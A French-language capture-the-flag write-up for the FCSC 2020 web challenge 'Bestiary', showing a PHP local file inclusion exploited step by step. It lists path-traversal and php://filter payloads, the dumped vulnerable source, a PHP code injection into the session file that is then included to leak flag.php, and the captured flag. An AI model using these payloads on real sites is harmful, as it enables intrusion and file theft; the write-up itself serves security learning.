<p align="center">
  <a href="" rel="noopener">
 <img style="width:150px;" src="https://france-cybersecurity-challenge.fr/themes/ecsc/static/img/logo.png" alt="Project logo"></a>
</p>
<h1 align="center">Bestiary</h1>

<div align="center">

[![CTF](https://img.shields.io/badge/FCSC-2020-red.svg)](https://france-cybersecurity-challenge.fr/)
[![CTF](https://img.shields.io/badge/Catégorie-Web-yellow.svg)](#)

</div>

---

## 📝 Table des matières

- [Enoncé](#problem_statement)
- [Sources](#idea)

## 🧐 Enoncé <a name = "problem_statement"></a>

Nous avons une page qui permet d'afficher des informations sur des créature via une liste et un bouton.
Le nom du monstre passe en parametre dans l'url sous la forme ?monster=MONSTRE

Si l'on rentre n'importe quoi après le monster= deux erreurs apparaissent : 

```php
Warning: include(midq): failed to open stream: No such file or directory in /var/www/html/index.php on line 33
```
```php
Warning: include(): Failed opening 'midq' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 33
```

On peut en déduire que lorsque l'on tape du texte après monster= , cela permet d'inclure directement un fichier. 

Essayons la faille LFI.

```php
?monster=../../../etc/passwd
```
Le fichier passwd s'affiche avec succès.

Essayons d'afficher l'index.
```php
?monster=./index.php
```
Des erreurs apparaissent en boucle
```php
Warning: session_save_path(): Cannot change save path when session is active in /var/www/html/index.php on line 2
```

Passons à l'utilisation des wrappers :

PHP://filter

```php
?monster=php://filter/convert.base64-encode/resource=index.php
```

Ok, il y a un résultat:

```php
 PD9waHAKCXNlc3Npb25fc2F2ZV9wYXRoKCIuL3Nlc3Npb25zLyIpOwoJc2Vzc2lvbl9zdGFydCgpOwoJaW5jbHVkZV9vbmNlKCdmbGFnLnBocCcpOwo/Pgo8aHRtbD4KPGhlYWQ+Cgk8dGl0bGU+QmVzdGlhcnk8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiMzQ0IzNzE7Ij4KPGNlbnRlcj48aDE+QmVzdGlhcnk8L2gxPjwvY2VudGVyPgo8c2NyaXB0PgpmdW5jdGlvbiBzaG93KCkKewoJdmFyIG1vbnN0ZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibW9uc3RlciIpLnZhbHVlOwoJZG9jdW1lbnQubG9jYXRpb24uaHJlZiA9ICJpbmRleC5waHA/bW9uc3Rlcj0iK21vbnN0ZXI7Cn0KPC9zY3JpcHQ+Cgo8cD4KPD9waHAKCSRtb25zdGVyID0gTlVMTDsKCglpZihpc3NldCgkX1NFU1NJT05bJ21vbnN0ZXInXSkgJiYgIWVtcHR5KCRfU0VTU0lPTlsnbW9uc3RlciddKSkKCQkkbW9uc3RlciA9ICRfU0VTU0lPTlsnbW9uc3RlciddOwoJaWYoaXNzZXQoJF9HRVRbJ21vbnN0ZXInXSkgJiYgIWVtcHR5KCRfR0VUWydtb25zdGVyJ10pKQoJewoJCSRtb25zdGVyID0gJF9HRVRbJ21vbnN0ZXInXTsKCQkkX1NFU1NJT05bJ21vbnN0ZXInXSA9ICRtb25zdGVyOwoJfQoKCWlmKCRtb25zdGVyICE9PSBOVUxMICYmIHN0cnBvcygkbW9uc3RlciwgImZsYWciKSA9PT0gRmFsc2UpCgkJaW5jbHVkZSgkbW9uc3Rlcik7CgllbHNlCgkJZWNobyAiU2VsZWN0IGEgbW9uc3RlciB0byByZWFkIGhpcyBkZXNjcmlwdGlvbi4iOwo/Pgo8L3A+Cgo8c2VsZWN0IGlkPSJtb25zdGVyIj4KCTxvcHRpb24gdmFsdWU9ImJlaG9sZGVyIj5CZWhvbGRlcjwvb3B0aW9uPgoJPG9wdGlvbiB2YWx1ZT0iZGlzcGxhY2VyX2JlYXN0Ij5EaXNwbGFjZXIgQmVhc3Q8L29wdGlvbj4KCTxvcHRpb24gdmFsdWU9Im1pbWljIj5NaW1pYzwvb3B0aW9uPgoJPG9wdGlvbiB2YWx1ZT0icnVzdF9tb25zdGVyIj5SdXN0IE1vbnN0ZXI8L29wdGlvbj4KCTxvcHRpb24gdmFsdWU9ImdlbGF0aW5vdXNfY3ViZSI+R2VsYXRpbm91cyBDdWJlPC9vcHRpb24+Cgk8b3B0aW9uIHZhbHVlPSJvd2xiZWFyIj5Pd2xiZWFyPC9vcHRpb24+Cgk8b3B0aW9uIHZhbHVlPSJsaWNoIj5MaWNoPC9vcHRpb24+Cgk8b3B0aW9uIHZhbHVlPSJ0aGVfZHJvdyI+VGhlIERyb3c8L29wdGlvbj4KCTxvcHRpb24gdmFsdWU9Im1pbmRfZmxheWVyIj5NaW5kIEZsYXllcjwvb3B0aW9uPgoJPG9wdGlvbiB2YWx1ZT0idGFycmFzcXVlIj5UYXJyYXNxdWU8L29wdGlvbj4KPC9zZWxlY3Q+IDxpbnB1dCB0eXBlPSJidXR0b24iIHZhbHVlPSJzaG93IGRlc2NyaXB0aW9uIiBvbmNsaWNrPSJzaG93KCkiPgo8ZGl2IHN0eWxlPSJmb250LXNpemU6NzAlIj5Tb3VyY2UgOiBodHRwczovL2lvOS5naXptb2RvLmNvbS90aGUtMTAtbW9zdC1tZW1vcmFibGUtZHVuZ2VvbnMtZHJhZ29ucy1tb25zdGVycy0xMzI2MDc0MDMwPC9kaXY+PGJyIC8+CjwvYm9keT4KPC9odG1sPgo=
 ```

 On peut voir que c'est du base64, allons voir ce qu'il nous donne après avoir converti.

 Pour cela rendons nous sur <a href="https://gchq.github.io/CyberChef/">CyberChef</a> et utilisons le "From base64".

 On peut voir un code php : 

 ```php
 <?php
	session_save_path("./sessions/");
	session_start();
	include_once('flag.php');
?>
<html>
<head>
	<title>Bestiary</title>
</head>
<body style="background-color:#3CB371;">
<center><h1>Bestiary</h1></center>
<script>
function show()
{
	var monster = document.getElementById("monster").value;
	document.location.href = "index.php?monster="+monster;
}
</script>

<p>
<?php
	$monster = NULL;

	if(isset($_SESSION['monster']) && !empty($_SESSION['monster']))
		$monster = $_SESSION['monster'];
	if(isset($_GET['monster']) && !empty($_GET['monster']))
	{
		$monster = $_GET['monster'];
		$_SESSION['monster'] = $monster;
	}

	if($monster !== NULL && strpos($monster, "flag") === False)
		include($monster);
	else
		echo "Select a monster to read his description.";
?>
</p>

<select id="monster">
	<option value="beholder">Beholder</option>
	<option value="displacer_beast">Displacer Beast</option>
	<option value="mimic">Mimic</option>
	<option value="rust_monster">Rust Monster</option>
	<option value="gelatinous_cube">Gelatinous Cube</option>
	<option value="owlbear">Owlbear</option>
	<option value="lich">Lich</option>
	<option value="the_drow">The Drow</option>
	<option value="mind_flayer">Mind Flayer</option>
	<option value="tarrasque">Tarrasque</option>
</select> <input type="button" value="show description" onclick="show()">
<div style="font-size:70%">Source : https://io9.gizmodo.com/the-10-most-memorable-dungeons-dragons-monsters-1326074030</div><br />
</body>
</html>
```

Les lignes qui nous interesses le plus sont :

```php
session_save_path("./sessions/");
```
```php
include_once('flag.php');
```
```php
$monster = NULL;

if(isset($_SESSION['monster']) && !empty($_SESSION['monster']))
		$monster = $_SESSION['monster'];
if(isset($_GET['monster']) && !empty($_GET['monster']))
{
		$monster = $_GET['monster'];
		$_SESSION['monster'] = $monster;
}

if($monster !== NULL && strpos($monster, "flag") === False)
		include($monster);
else
    echo "Select a monster to read his description.";
```

Si on commence par la partie condition, il faut que le parametre 'monster' soit définit et non vide, ensuite, il créer une variable monster égal à $_SESSION['monster']

Ensuite, la même condition mais $monster est égal à la valeur du parametre get monster. Puis la Session est définie avec la valeur monster.

Si monster contient flag alors on affiche rien.

Comme ont à pu le voir, nous ne pouvons pas afficher le flag à cause de la condition dans l'url.

Regardons la documentation PHP pour trouver le nom du fichier session:

<a href="https://www.php.net/manual/fr/function.session-save-path.php">Documentation - Session_save_path</a>

```
session_save_path — Lit et/ou modifie le chemin de sauvegarde des sessions
```

Allons voir les parametres <a href="https://www.php.net/manual/fr/session.configuration.php#ini.session.save-path">session.save_path</a>

J'ai trouvé : 
```
votre fichier sera situé dans /tmp/4/b/1/e/3/sess_4b1e384ad74619bd212e236e52a5a174If
```
et 
```
 Par défaut, c'est PHPSESSID.
```

Donc ont peut se dire que le fichier sera sess_PHPSESSID

Essayons d'afficher la session.
```
?monster=./sessions/sess_2bd5ffa68cfa0c33917748582f39cac4
```
Ca fonctionne:
```
 bW9uc3RlcnxzOjUzOiJwaHA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPWluZGV4LnBocCI7
```
```
monster|s:53:"php://filter/convert.base64-encode/resource=index.php";
```

Essayons de passer du code php dans l'url pour récuperer le flag.

```
?monster=<?php echo file_get_contents("/var/www/html/flag.php");?>
```

Aucun message, allons voir comment se porte le fichier de session
```
?monster=./sessions/sess_2bd5ffa68cfa0c33917748582f39cac4
```
L'affichage est bugé, je vais voir ce qu'il se passe dans le code source..

```html
<html>
<head>
	<title>Bestiary</title>
</head>
<body style="background-color:#3CB371;">
<center><h1>Bestiary</h1></center>
<script>
function show()
{
	var monster = document.getElementById("monster").value;
	document.location.href = "index.php?monster="+monster;
}
</script>

<p>
monster|s:57:"<?php
	$flag="FCSC{83f5d0d1a3c9c82da282994e348ef49949ea4977c526634960f44b0380785622}";
";</p>

<select id="monster">
	<option value="beholder">Beholder</option>
	<option value="displacer_beast">Displacer Beast</option>
	<option value="mimic">Mimic</option>
	<option value="rust_monster">Rust Monster</option>
	<option value="gelatinous_cube">Gelatinous Cube</option>
	<option value="owlbear">Owlbear</option>
	<option value="lich">Lich</option>
	<option value="the_drow">The Drow</option>
	<option value="mind_flayer">Mind Flayer</option>
	<option value="tarrasque">Tarrasque</option>
</select> <input type="button" value="show description" onclick="show()">
<div style="font-size:70%">Source : https://io9.gizmodo.com/the-10-most-memorable-dungeons-dragons-monsters-1326074030</div><br />
</body>
</html>
```

Hop ! Le flag est attrapé !
```
$flag="FCSC{83f5d0d1a3c9c82da282994e348ef49949ea4977c526634960f44b0380785622}";
```

## ⛓️ Sources <a name = "limitations"></a>

CyberChef : https://gchq.github.io/CyberChef/<br>
DocPHP : https://www.php.net/manual/fr/
